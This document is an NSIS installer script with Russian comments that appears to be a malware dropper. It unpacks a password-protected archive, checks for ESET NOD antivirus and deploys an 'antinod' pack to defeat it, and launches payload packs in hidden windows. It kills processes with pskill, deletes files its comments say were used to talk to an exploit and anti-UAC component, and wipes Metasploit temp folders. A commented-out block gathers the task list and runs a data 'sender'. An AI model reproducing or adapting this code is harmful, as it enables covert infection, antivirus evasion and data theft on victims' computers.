# 
# Main package installer
# 

Name "M"
OutFile "pack1.~exe"
RequestExecutionLevel user
CRCCheck off

# Директория с плагинами для расширения функционала
!addplugindir ..\_NSISShare\Plugins

# Глобальные переменные
Var UnZipDir ; директория для распаковки временных файлов и утилит

# Пароль для расшифровки архивов
!define ZIP_PWD "%password%"

# Headers
!include "Settings.nsh"
!include "nsProcess.nsh"
!include "FileFunc.nsh"
!include "Utils.nsh"
!include "UnZip.nsh"
!include "FileProcess.nsh"
!include "SelfDel.nsh"
!include "InstDir.nsh"
!include "IPC.nsh"
!include "Pwd.nsh"
!include "AVDetect.nsh"

;----------------------------------------------------------------------------------
!define InstallPack "!insertmacro _InstallPack"
!macro _InstallPack _PackName_ _TimeOut_
  ${UnZipFileName} ${MAIN_ZIP} "${_PackName_}${EXE_TMP}" "${ZIP_PWD}"  
  ${DbgBox} "${_PackName_}${EXE_TMP}"
  IfFileExists "$UnZipDir\${_PackName_}${EXE_TMP}" 0 +5
    Rename "$UnZipDir\${_PackName_}${EXE_TMP}" "$UnZipDir\${_PackName_}${EXE_EXE}"
    Push "${_PackName_}${EXE_EXE}"
    Push "${_TimeOut_}"
    Call InstallPack
!macroend

Function KillProcess
  ${UnZipFileName} ${MAIN_ZIP} "pskill.exe" "${ZIP_PWD}"  
  ${ExecCmd} "$UnZipDir\pskill /accepteula $1"
FunctionEnd

function InstallPack
  Exch $0   ; $0 = _TimeOut_
  Exch 
  Exch $1   ; $1 = _PackName_
  Exch 
    Push $2
    Push $R0                 
      ExecShell "open" "$UnZipDir\$1" SW_HIDE 

      IntOp $0 $0 * 60 ; переводим таймаут в секунды
      IntOp $2 0 + 0   ; счётчик прошедшего времени
        loop:
           Sleep 10000
           IntOp $2 $2 + 10
           IntCmpU $2 $0 exit1 proc exit1
        proc:
          ${nsProcess::FindProcess} "$1" $R0
          ${If} $R0 == 0
             goto loop
          ${Else}
             goto exit2
          ${EndIf}    
        exit1:
          ;${DbgBox} "Killing"
          ;${nsProcess::KillProcess} "$1" $R0 ; Nod64 detect
          Call KillProcess
          Call DelIPCFiles
        exit2:
          ${nsProcess::Unload}  
    Pop $R0
    Pop $2
  Pop $0
  Pop $1 
FunctionEnd

;----------------------------------------------------------------------------------
;Function SendTaskList
/*  ${UnZipFile} files1.bin "%password%" ; Сендер
  ${WriteToFile} "$UnZipDir\def138.txt" `${Php_Password}`
  ${ExecCmd} "$SYSDIR\tasklist.exe > abc5134.txt"
  ${ExecCmd} "$UnZipDir\dns.exe"
*/
;FunctionEnd

;----------------------------------------------------------------------------------
Function CleanTempFiles
  ${Locate} "$TEMP" "/L=D /M=msf*.tmp /G=0" "CleanMsfCallBack"
  IfErrors loc2

loc2:
;  ${Locate} "$TEMP" "/L=F /M=*.bat /G=0 /S=45:45B" "CleanUacCallBack"
;  IfErrors endFunc

;endFunc:
  Call DelIPCFiles ; Удаляем файлы коммуникации со сплоитом/антиуаком
/*  Delete "$TEMP\${L1_EXE}"
  Delete "$TEMP\${L2_EXE}"
  Delete "$TEMP\${M32_EXE}"
  Delete "$TEMP\${M64_EXE}"
  Delete "$TEMP\${H1_DLL}"
  Delete "$TEMP\${H2_DLL}" */
FunctionEnd
 
Function CleanMsfCallBack
;  ${DbgBox} $R9
  RMDir /r $R9
 
  Push $0
FunctionEnd

Function CleanUacCallBack
;  ${DbgBox} $R9
  Delete $R9
 
  Push $0
FunctionEnd

/*
Function DelCab
  push $0
  push $R0
    StrCpy $0 $APPDATA\1.CAB
      ReadEnvStr $R0 COMSPEC
      nsExec::Exec "$R0 /C del /F /Q $0"
  pop $R0
  pop $0
FunctionEnd
*/

;================================================================================================================

; Main section
Section
  # Скидываем главный архив
  ${DropMainZip}

  ${DbgBox} "Pause"

  # Сразу проверяем, установлен ли Eset NOD
  Call CheckEset 
  StrCmp $9 "0" skip_anod
    ${InstallPack} ${ANTINOD_PACK} 4
skip_anod:
    ${InstallPack} ${NOTEPAD_PACK} 3

    ${InstallPack} ${LITEMAN_PACK} 5

  ;${nsProcess::KillProcess} "" $3
  Call CleanTempFiles ; Удаляем файлы и директории, оставшиеся от прерванных пакетов

SectionEnd ; end the section
